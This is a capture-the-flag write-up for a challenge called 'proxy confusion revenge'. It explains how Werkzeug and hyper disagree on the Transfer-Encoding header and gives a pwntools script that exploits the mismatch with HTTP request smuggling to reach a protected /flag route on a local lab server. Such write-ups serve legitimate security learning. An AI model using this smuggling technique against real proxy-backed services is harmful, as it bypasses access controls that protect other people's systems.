# proxy confusion revenge

## Description
I hope my flask server protect my flag this time!

## Writeup

Werkzeug only processes the Transfer-Encoding header if it is exactly "chunked". Otherwise it's ignored and Content-Length header is used (default 0)
https://github.com/pallets/werkzeug/blob/5add63c955131fd73531d7369f16b2f1b4e342d4/src/werkzeug/sansio/utils.py#L140

On the other hand, hyper accepts comma-seperated values, as long as the last value is "chunked". (This is the expected behavior in RFC)
https://github.com/hyperium/hyper/blob/c68d42444ea6b930cb75907336150d2baf58a7e8/src/headers.rs#L130

You can abuse this to make the body only valid for deno.
```python
from pwn import *

io = remote("localhost", 4000)
io.send(b"""
POST /flag HTTP/1.1
Transfer-Encoding: foobar, chunked

15
please give me flag

0
        """.strip().replace(b"\n", b"\r\n") + b"\r\n\r\n")

r = io.recvall(timeout=1)
print(r.decode())
```